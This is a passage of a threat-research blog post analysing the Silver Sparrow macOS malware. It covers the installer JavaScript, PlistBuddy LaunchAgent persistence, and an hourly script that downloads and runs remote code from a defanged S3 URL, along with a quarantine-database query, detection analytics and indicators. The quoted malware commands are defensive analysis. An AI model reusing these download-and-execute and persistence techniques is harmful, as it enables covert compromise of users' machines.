target=\"_blank\"\u003eVirusTotal sample\u003c/a\u003e\u003c/li\u003e\u003c/ul\u003e\u003cp dir=\"ltr\"\u003eOutside of a change in download URLs and script comments, the two versions had only one major difference. The first version contained a Mach-O binary compiled for Intel x86_64 architecture only (\u003ccode\u003eupdater\u003c/code\u003e MD5: c668003c9c5b1689ba47a431512b03cc). In the second version, the adversary included a Mach-O binary compiled for both Intel x86_64 and M1 ARM64 architectures (\u003ccode\u003etasker\u003c/code\u003e MD5: b370191228fef82635e39a137be470af). This is significant because the M1 ARM64 architecture is young, and \u003ca href=\"https://objective-see.com/blog/blog_0x62.html\" target=\"_blank\"\u003eresearchers have uncovered very few threats for the new platform\u003c/a\u003e.\u003c/p\u003e\u003cp dir=\"ltr\"\u003eAs we’ll explain in detail in the technical analysis, the Mach-O compiled binaries don’t seem to do all that much—at least not as of this writing—and so we’ve been calling them “bystander binaries.” The following image represents a high-level look at the two versions of Silver Sparrow malware.\u003c/p\u003e\u003cimg src=\"https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/page/blog/uploads/2021/02/Screen-Shot-2021-02-18-at-4.55.37-PM.png\" class=\"align-center\" alt=\"Image\" loading=\"lazy\" decoding=\"async\"\u003e\u003cp\u003e \u003c/p\u003e\u003ch3\u003eJavaScript in the installer\u003c/h3\u003e\u003cp dir=\"ltr\"\u003eWe’ve found that many macOS threats are distributed through \u003ca href=\"https://blog.confiant.com/confiant-malwarebytes-uncover-steganography-based-ad-payload-that-drops-shlayer-trojan-on-mac-cd31e885c202\" target=\"_blank\"\u003emalicious advertisements as single\u003c/a\u003e, self-contained installers in \u003ca href=\"https://en.wikipedia.org/wiki/Installer_(macOS)\" target=\"_blank\"\u003ePKG\u003c/a\u003e or \u003ca href=\"https://en.wikipedia.org/wiki/Apple_Disk_Image\" target=\"_blank\"\u003eDMG\u003c/a\u003e form, masquerading as a legitimate application—such as Adobe Flash Player—or as updates. In this case, however, the adversary distributed the malware in two distinct packages: \u003ccode\u003eupdater.pkg\u003c/code\u003e and \u003ccode\u003eupdate.pkg\u003c/code\u003e. Both versions use the same techniques to execute, differing only in the compilation of the bystander binary.\u003c/p\u003e\u003cp dir=\"ltr\"\u003eIn order of appearance, the first novel and noteworthy thing about Silver Sparrow is that its installer packages leverage the macOS Installer JavaScript API to execute suspicious commands. While we’ve observed legitimate software doing this, this is the first instance we’ve observed it in malware. This is a deviation from behavior we usually observe in malicious macOS installers, which \u003ca href=\"https://blog.malwarebytes.com/mac/2020/06/new-mac-ransomware-spreading-through-piracy/\" target=\"_blank\"\u003egenerally use preinstall or postinstall scripts to execute commands\u003c/a\u003e . In preinstall and postinstall cases, the installation generates a particular telemetry pattern that tends to look something like the following:\u003c/p\u003e\u003cul\u003e\u003cli\u003eParent process: \u003ccode\u003epackage_script_service\u003c/code\u003e\u003c/li\u003e\u003cli\u003eProcess: \u003ccode\u003ebash\u003c/code\u003e, \u003ccode\u003ezsh\u003c/code\u003e, \u003ccode\u003esh\u003c/code\u003e, Python, or another interpreter\u003c/li\u003e\u003cli\u003eCommand line: contains \u003ccode\u003epreinstall\u003c/code\u003e or \u003ccode\u003epostinstall\u003c/code\u003e\u003c/li\u003e\u003c/ul\u003e\u003cp dir=\"ltr\"\u003eThis telemetry pattern isn’t a particularly high-fidelity indicator of maliciousness on its own because even legitimate software uses the scripts, but it does reliably identify installers using preinstall and postinstall scripts in general. Silver Sparrow differs from what we expect to see from malicious macOS installers by including JavaScript commands within the package file’s Distribution definition XML file. This produces a different telemetry pattern:\u003c/p\u003e\u003cul\u003e\u003cli\u003eParent process: \u003ccode\u003eInstaller\u003c/code\u003e\u003c/li\u003e\u003cli\u003eProcess: \u003ccode\u003ebash\u003c/code\u003e\u003c/li\u003e\u003c/ul\u003e\u003cp dir=\"ltr\"\u003eAs with preinstall and postinstall scripts, this telemetry pattern isn’t enough to identify malicious behavior on its own. Preinstall and postinstall scripts include command-line arguments that offer clues into what’s actually getting executed. The malicious JavaScript commands, on the other hand, run using the legitimate macOS Installer process and offer very little visibility into the contents of the installation package or how that package uses the JavaScript commands.\u003c/p\u003e\u003cp dir=\"ltr\"\u003eThe entry point to the code lives within the package’s \u003ccode\u003eDistribution\u003c/code\u003e definition XML file, which contains an installation-check tag specifying what function to execute during the “\u003ca href=\"https://developer.apple.com/library/archive/documentation/DeveloperTools/Reference/DistributionDefinitionRef/Chapters/Distribution_XML_Ref.html#//apple_ref/doc/uid/TP40005370-CH100-SW12\" target=\"_blank\"\u003eInstallation Check\u003c/a\u003e” phase:\u003c/p\u003e\u003cp dir=\"ltr\"\u003eThe installer used three JavaScript functions for all the heavy lifting inside the “installation_check()” function :\u003c/p\u003e\u003cpre\u003e\u003ccode class=\"language-plaintext\"\u003efunction bash(command) { system.run('/bin/bash', '-c', command) } function appendLine(line, file) { bash(`printf '%b\\n' '${line}' \u0026gt;\u0026gt; ${file}`) } function appendLinex(line, file) { bash(`'echo' ${line} \u0026gt;\u0026gt; ${file}`) } function appendLiney(line, file) { bash(`printf '%b' '${line}' \u0026gt;\u0026gt; ${file}`) } \u003c/code\u003e\u003c/pre\u003e \u003cp dir=\"ltr\"\u003eNote that in the code above, Silver Sparrow uses Apple’s \u003ccode\u003esystem.run\u003c/code\u003e command for execution. Apple \u003ca href=\"https://developer.apple.com/documentation/installer_js/system/1812364-run\" target=\"_blank\"\u003edocumented\u003c/a\u003e the \u003ccode\u003esystem.run\u003c/code\u003e code as launching “a given program in the Resources directory of the installation package,” but it’s not limited to using the Resources directory. As observed with Silver Sparrow, you can provide the full path to a process for execution and its arguments. By taking this route, the malware causes the installer to spawn multiple \u003ccode\u003ebash\u003c/code\u003e processes that it can then use to accomplish its objectives.\u003c/p\u003e\u003cp dir=\"ltr\"\u003eThe functions \u003ccode\u003eappendLine\u003c/code\u003e, \u003ccode\u003eappendLinex\u003c/code\u003e, and \u003ccode\u003eappendLiney\u003c/code\u003e extend the \u003ccode\u003ebash\u003c/code\u003e commands with arguments that write input to files on disk. Silver Sparrow writes each of its components out line by line with JavaScript commands:\u003c/p\u003e\u003cpre\u003e\u003ccode class=\"language-bash\"\u003eappendLine(`initTime=\\$1`, updaterMonitorPath) appendLine(`/usr/bin/curl ${url} \u0026gt; /tmp/version.json`, updaterMonitorPath) appendLine(`plutil -convert xml1 -r /tmp/version.json -o /tmp/version.plist`, updaterMonitorPath) appendLine(`wait=$(/usr/libexec/PlistBuddy -c 'Print :dls' /tmp/version.plist)`, updaterMonitorPath) appendLine(`wait=\\$((\\$wait* 60 ))`, updaterMonitorPath) appendLine(`instVersion=1`, updaterMonitorPath)\u003c/code\u003e\u003c/pre\u003e \u003cp dir=\"ltr\"\u003eThis approach may avoid simple static signatures by dynamically generating the script rather than using a static script file. In addition, the commands let the adversary quickly modify the code to be much more versatile should they decide to make a change. Altogether, it means the adversary was likely attempting to evade detection and ease development.\u003c/p\u003e\u003cp dir=\"ltr\"\u003eOnce all the commands get written, two new scripts exist on disk: \u003ccode\u003e/tmp/agent.sh\u003c/code\u003e and \u003ccode\u003e~/Library/Application Support/verx_updater/verx.sh\u003c/code\u003e. The \u003ccode\u003eagent.sh\u003c/code\u003e script executes immediately at the end of the installation to contact an adversary-controlled system and indicate that installation occurred. The \u003ccode\u003everx.sh\u003c/code\u003e script executes periodically because of a persistent LaunchAgent to contact a remote host for more information.\u003c/p\u003e\u003ch3\u003eEveryone needs a (Plist)Buddy\u003c/h3\u003e\u003cp dir=\"ltr\"\u003eOur initial indication of malicious activity was the \u003ccode\u003ePlistBuddy\u003c/code\u003e process creating a LaunchAgent, so let’s explore the significance of that.\u003c/p\u003e\u003cp dir=\"ltr\"\u003eLaunchAgents provide a way to instruct \u003ccode\u003elaunchd\u003c/code\u003e, the macOS initialization system, to periodically or automatically execute tasks. They can be written by any user on the endpoint, but they will usually also execute as the user that writes them. For example, if the user \u003ccode\u003etlambert\u003c/code\u003e writes \u003ccode\u003e~/Library/LaunchAgents/evil.plist\u003c/code\u003e the tasks described in \u003ccode\u003eevil.plist\u003c/code\u003e will usually execute as \u003ccode\u003etlambert\u003c/code\u003e. For more information, refer to \u003ca href=\"https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html\" target=\"_blank\"\u003eApple’s documentation\u003c/a\u003e.\u003c/p\u003e\u003cp dir=\"ltr\"\u003eWhile tools like \u003ca href=\"https://osquery.io/schema/4.6.0/#launchd\" target=\"_blank\"\u003eosquery\u003c/a\u003e and antimalware controls have excellent visibility into the contents of LaunchAgents, some endpoint detection and response (EDR) tools have a hard time gaining visibility into LaunchAgents. EDR tooling tends to rely on process monitoring that offers a great deal of visibility into the creation—but not necessarily the contents—of a file. For example, an EDR tool might offer you the following shell command:\u003c/p\u003e\u003cp dir=\"ltr\"\u003ecp /Volumes/TotesLegit.app/Resources/launcher.plist ~/Library/LaunchAgents/launcher.plist\u003c/p\u003e\u003cp dir=\"ltr\"\u003eAs a result, detecting a persistence mechanism in the form of a malicious LaunchAgent can be extremely difficult using EDR alone because it requires you to analyze surrounding activity to make a decision about the installer itself. In other words: you know that the LaunchAgent can be used as a persistence mechanism, but—since you might not be able to see the contents of the LaunchAgent file—you have to rely on context to determine the intent of that LaunchAgent.\u003c/p\u003e\u003cp dir=\"ltr\"\u003eThankfully, there are multiple ways to create property lists (plists) on macOS, and sometimes adversaries use different methods to achieve their needs. One such way is through \u003ccode\u003ePlistBuddy\u003c/code\u003e, a built-in tool that allows you to create various property lists on an endpoint, including LaunchAgents. Sometimes adversaries turn to \u003ccode\u003ePlistBuddy\u003c/code\u003e to establish persistence, and doing so enables defenders to readily inspect the contents of a LaunchAgent using EDR because all the properties of the file get shown on the command line before writing. In Silver Sparrow’s case, we observed commands writing the content of the plist:\u003c/p\u003e\u003cpre\u003e\u003ccode class=\"language-plaintext\"\u003ePlistBuddy -c 'Add :Label string init_verx' ~/Library/Launchagents/init_verx.plist PlistBuddy -c 'Add :RunAtLoad bool true' ~/Library/Launchagents/init_verx.plist PlistBuddy -c 'Add :StartInterval integer 3600' ~/Library/Launchagents/init_verx.plist PlistBuddy -c 'Add :ProgramArguments array' ~/Library/Launchagents/init_verx.plist PlistBuddy -c 'Add :ProgramArguments:0 string '/bin/sh'' ~/Library/Launchagents/init_verx.plist PlistBuddy -c 'Add :ProgramArguments:1 string -c' ~/Library/Launchagents/init_verx.plist\u003c/code\u003e\u003c/pre\u003e \u003cp dir=\"ltr\"\u003eIn its final form on disk, the LaunchAgent Plist XML will resemble the following:\u003c/p\u003e\u003cp dir=\"ltr\"\u003e Label init_verx RunAtLoad true StartInterval 3600 ProgramArguments '/bin/sh' -c '~/Library/Application\\\\ Support/verx_updater/verx.sh' [timestamp] [data from plist downloaded] 1 \u003c/p\u003e\u003cp\u003e \u003c/p\u003e\u003ch3\u003eCommand and control (C2)\u003c/h3\u003e\u003cp dir=\"ltr\"\u003eEvery hour, the persistence LaunchAgent tells \u003ccode\u003elaunchd\u003c/code\u003e to execute a shell script that downloads a JSON file to disk, converts it into a plist, and uses its properties to determine further actions.\u003c/p\u003e\u003cpre\u003e\u003ccode class=\"language-bash\"\u003ecurl hxxps://specialattributes.s3.amazonaws[.]com/applications/updater/ver.json \u0026gt; /tmp/version.json plutil -convert xml1 -r /tmp/version.json -o /tmp/version.plist ... curl $(/usr/libexec/PlistBuddy -c 'Print :downloadUrl' /tmp/version.plist) --output /tmp/verx chmod 777 /tmp/verx /tmp/verx upbuchupsf \u003c/code\u003e\u003c/pre\u003e \u003cp dir=\"ltr\"\u003eThe structure of the downloaded version.json file looks like this:\u003c/p\u003e\u003cpre\u003e\u003ccode class=\"language-plaintext\"\u003e{'version':2,'label':'verx','args':'upbuchupsf','dls':4320,'run':true,'loc':'~\\/Library\\/._insu','downloadUrl':''}\u003c/code\u003e\u003c/pre\u003e \u003cp dir=\"ltr\"\u003eEvery hour that \u003ccode\u003edownloadUrl\u003c/code\u003e property gets checked for additional content to download and executes. After observing the malware for over a week, neither we nor our research partners observed a final payload, leaving the ultimate goal of Silver Sparrow activity a mystery.\u003c/p\u003e\u003cp dir=\"ltr\"\u003eSilver Sparrow’s use of infrastructure hosted on \u003ca href=\"https://aws.amazon.com/s3/\" target=\"_blank\"\u003eAWS S3\u003c/a\u003e is interesting because AWS offers a highly available and resilient file distribution method. The adversary can create a bucket, serve out files, and operate without worrying about the additional network administration and overhead associated with doing all of this in house. In addition, callback domains for this activity cluster leveraged domains hosted through \u003ca href=\"https://www.akamai.com/us/en/resources/content-distribution-network.jsp\" target=\"_blank\"\u003eAkamai CDN\u003c/a\u003e. This implies that the adversary likely understands cloud infrastructure and its benefits over a single server or non-resilient system. Further, the adversary that likely understands this hosting choice allows them to blend in with the normal overhead of cloud infrastructure traffic. Most organizations cannot afford to block access to resources in AWS and Akamai. The decision to use AWS infrastructure further supports our assessment that this is an operationally mature adversary.\u003c/p\u003e\u003ch3\u003eMysteries on mysteries\u003c/h3\u003e\u003cp dir=\"ltr\"\u003eIn addition to the payload mystery, Silver Sparrow includes a file check that causes the removal of all persistence mechanisms and scripts. It checks for the presence of \u003ccode\u003e~/Library/._insu\u003c/code\u003e on disk, and, if the file is present, Silver Sparrow removes all of its components from the endpoint. Hashes reported from Malwarebytes (\u003ccode\u003ed41d8cd98f00b204e9800998ecf8427e\u003c/code\u003e) indicated that the \u003ccode\u003e._insu\u003c/code\u003e file was empty. The presence of this feature is also something of a mystery.\u003c/p\u003e\u003cpre\u003e\u003ccode class=\"language-bash\"\u003eif [ -f ~/Library/._insu ] then rm ~/Library/Launchagents/verx.plist rm ~/Library/Launchagents/init_verx.plist rm /tmp/version.json rm /tmp/version.plist rm /tmp/verx rm -r ~/Library/Application\\\\ Support/verx_updater rm /tmp/agent.sh launchctl remove init_verx\u003c/code\u003e\u003c/pre\u003e \u003cp dir=\"ltr\"\u003eThe \u003ccode\u003e._insu\u003c/code\u003e file does not appear present by default on macOS, and we currently don’t know the circumstances under which the file appears.\u003c/p\u003e\u003ch3\u003eThe final callback\u003c/h3\u003e\u003cp dir=\"ltr\"\u003eAt the end of the installation, Silver Sparrow executes two discovery commands to construct data for a \u003ccode\u003ecurl\u003c/code\u003e HTTP POST request indicating that the installation occurred. One retrieves the system UUID for reporting, and the second finds more interesting information: the URL used to download the original package file.\u003c/p\u003e\u003cp dir=\"ltr\"\u003eBy executing a sqlite3 query, the malware finds the original URL the PKG downloaded from, giving the adversary an idea of successful distribution channels. We commonly see this kind of activity with malicious adware on macOS.\u003c/p\u003e\u003cpre\u003e\u003ccode class=\"language-python\"\u003esqlite3 sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV* 'select LSQuarantineDataURLString from LSQuarantineEvent where LSQuarantineDataURLString like “[redacted]' order by LSQuarantineTimeStamp desc'\u003c/code\u003e\u003c/pre\u003e \u003cp\u003e \u003c/p\u003e\u003ch3\u003eHello, World: bystander binaries\u003c/h3\u003e\u003cp dir=\"ltr\"\u003eThe first version of Silver Sparrow malware (\u003ccode\u003eupdater.pkg\u003c/code\u003e MD5: 30c9bc7d40454e501c358f77449071aa) that we analyzed contained an extraneous Mach-O binary (\u003ccode\u003eupdater\u003c/code\u003e MD5: c668003c9c5b1689ba47a431512b03cc), compiled for Intel x86_64 that appeared to play no additional role in the Silver Sparrow execution. Ultimately this binary seems to have been included as placeholder content to give the PKG something to distribute outside the JavaScript execution. It simply says, “Hello, World!” (literally!)\u003c/p\u003e\u003cimg src=\"https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/page/blog/uploads/2021/02/image3.png\" alt=\"Image\" loading=\"lazy\" decoding=\"async\"\u003e\u003cp dir=\"ltr\"\u003ev1 Image Credit: Erika Noerenberg\u003c/p\u003e\u003cp dir=\"ltr\"\u003eThe second version (\u003ccode\u003eupdate.pkg\u003c/code\u003e MD5: fdd6fb2b1dfe07b0e57d4cbfef9c8149) also included an extraneous Mach-O binary (\u003ccode\u003etasker\u003c/code\u003e MD5: b370191228fef82635e39a137be470af) that was compiled to be compatible with both Intelx86_64 and M1 ARM64. Like before, this binary seems to have been included as a placeholder—this time, displaying the message “You did it!”\u003c/p\u003e\u003cimg src=\"https://cms.zscaler.com/cdn-cgi/image/format=auto/sites/default/files/images/page/blog/uploads/2021/02/image1-1.png\" alt=\"Image\" loading=\"lazy\" decoding=\"async\"\u003e\u003cp dir=\"ltr\"\u003ev2 Image Credit: Jimmy Astle\u003c/p\u003e\u003cp dir=\"ltr\"\u003eYou can observe the dual architecture support from version 2 of the extraneous Mach-O binary by checking out the output of \u003ccode\u003efile\u003c/code\u003e command on macOS or Linux systems examining the binary:\u003c/p\u003e\u003cp dir=\"ltr\"\u003etasker: Mach-O universal binary with 2 architectures: [x86_64:Mach-O 64-bit x86_64 executable, flags:\u003c/p\u003e] [arm64:Mach-O 64-bit arm64 executable, flags:]\u003cp dir=\"ltr\"\u003eBy contrast, the output of the \u003ccode\u003efile\u003c/code\u003e command from the extraneous Mach-O binary in version 1 would look like the following:\u003c/p\u003eupdater: Mach-O 64-bit x86_64 executable, flags:\u003cp\u003e \u003c/p\u003e\u003ch3\u003eTimeline\u003c/h3\u003e\u003cp dir=\"ltr\"\u003eWe don’t have a complete picture of exactly when Silver Sparrow first emerged, but we’ve been able to construct the following timeline through a mix of open source intelligence and Red Canary telemetry:\u003c/p\u003e\u003col\u003e\u003cli\u003eAugust 18, 2020: Malware version 1 (non-M1 version) callback domain \u003ccode\u003eapi.mobiletraits[.]com\u003c/code\u003e created (\u003ca href=\"https://community.riskiq.com/search/api.mobiletraits.com/whois\" target=\"_blank\"\u003esource\u003c/a\u003e)\u003c/li\u003e\u003cli\u003eAugust 31, 2020: Malware version 1 (non-M1 version) submitted to VirusTotal (\u003ca href=\"https://www.virustotal.com/gui/file/1decb4070db4dfe5d68ba502cf3a67de96a69ea6f3acfa4454795f96472ccc0d/submissions\" target=\"_blank\"\u003esource\u003c/a\u003e)\u003c/li\u003e\u003cli\u003eSeptember 2, 2020: \u003ccode\u003eversion.json\u003c/code\u003e file seen during malware version 2 execution submitted to VirusTotal (\u003ca href=\"https://www.virustotal.com/gui/file/fe3dfc11884801b6d1d331fb85f8ef822d8d4ecf329d9e71048b87b93bafe01b/details\" target=\"_blank\"\u003esource\u003c/a\u003e)\u003c/li\u003e\u003cli\u003eDecember 5, 2020: Malware version 2 (M1 version) callback domain created \u003ccode\u003eapi.specialattributes[.]com\u003c/code\u003e created (\u003ca href=\"https://community.riskiq.com/search/api.specialattributes.com/whois\" target=\"_blank\"\u003esource\u003c/a\u003e)\u003c/li\u003e\u003cli\u003eJanuary 22, 2021: PKG file version 2 (containing a M1 binary) submitted to VirusTotal (\u003ca href=\"https://www.virustotal.com/gui/file/c7dd06b20b64b64d3b155b6b77c2778a08ef6a6c0396d7537af411258e57af1e/details\" target=\"_blank\"\u003esource\u003c/a\u003e)\u003c/li\u003e\u003cli\u003eJanuary 26, 2021: Red Canary detects Silver Sparrow malware version 1\u003c/li\u003e\u003cli\u003eFebruary 9, 2021: Red Canary detects Silver Sparrow malware version 2 (M1 version)\u003c/li\u003e\u003c/ol\u003e\u003cp\u003e \u003c/p\u003e\u003ch2\u003eIntelligence gaps\u003c/h2\u003e\u003cp dir=\"ltr\"\u003eAt the time of publishing, we’ve identified a few unknown factors related to Silver Sparrow that we either don’t have visibility into or simply enough time hasn’t passed to observe. First, we aren’t certain of the initial distribution method for the PKG files. We suspect that malicious search engine results direct victims to download the PKGs based on network connections from a victim’s browser shortly before download. In this case we can’t be certain because we don’t have the visibility to determine exactly what caused the download.\u003c/p\u003e\u003cp dir=\"ltr\"\u003eNext, we don’t know the circumstances under which \u003ccode\u003e~/Library/._insu\u003c/code\u003e appears. This file may be part of a toolset the adversary wishes to avoid; it may be part of the malware’s life cycle itself as a way of removing components after an objective has been met.\u003c/p\u003e\u003cp dir=\"ltr\"\u003eIn addition, the ultimate goal of this malware is a mystery. We have no way of knowing with certainty what payload would be distributed by the malware, if a payload has already been delivered and removed, or if the adversary has a future timeline for distribution. Based on data shared with us by Malwarebytes, the nearly 30,000 affected hosts have not downloaded what would be the next or final payload.\u003c/p\u003e\u003cp dir=\"ltr\"\u003eFinally, the purpose of the Mach-O binary included inside the PKG files is also a mystery. Based on the data from script execution, the binary would only run if a victim intentionally sought it out and launched it. The messages we observed of “Hello, World!” or “You did it!” could indicate the threat is under development in a proof-of-concept stage or that the adversary just needed an application bundle to make the package look legitimate.\u003c/p\u003e\u003ch2\u003eDetection opportunities\u003c/h2\u003e\u003cp dir=\"ltr\"\u003eThe following section includes descriptions of the analytics that have helped us detect the Silver Sparrow downloader. That said, we didn’t build these analytics specifically for the purpose of detecting Silver Sparrow, so they may be useful for detecting a wide array of macOS threats. If one of these analytics alerts you to potentially malicious activity, we recommend searching for the presence of indicators (listed below) to confirm whether you are dealing with a Silver Sparrow infection or something else.\u003c/p\u003e\u003cul\u003e\u003cli\u003eLook for a process that appears to be \u003ccode\u003ePlistBuddy\u003c/code\u003e executing in conjunction with a command line containing the following: \u003ccode\u003eLaunchAgents\u003c/code\u003e and \u003ccode\u003eRunAtLoad\u003c/code\u003e and \u003ccode\u003etrue\u003c/code\u003e. This analytic helps us find multiple macOS malware families establishing LaunchAgent persistence.\u003c/li\u003e\u003cli\u003eLook for a process that appears to be \u003ccode\u003esqlite3\u003c/code\u003e executing in conjunction with a command line that contains: \u003ccode\u003eLSQuarantine\u003c/code\u003e. This analytic helps us find multiple macOS malware families manipulating or searching metadata for downloaded files.\u003c/li\u003e\u003cli\u003eLook for a process that appears to be \u003ccode\u003ecurl\u003c/code\u003e executing in conjunction with a command line that contains: \u003ccode\u003es3.amazonaws.com\u003c/code\u003e. This analytic helps us find multiple macOS malware families using S3 buckets for distribution.\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e \u003c/p\u003e\u003ch2\u003eIndicators of Compromise\u003c/h2\u003e\u003cp\u003e \u003c/p\u003e\u003ch3\u003eIn Versions 1 \u0026amp;
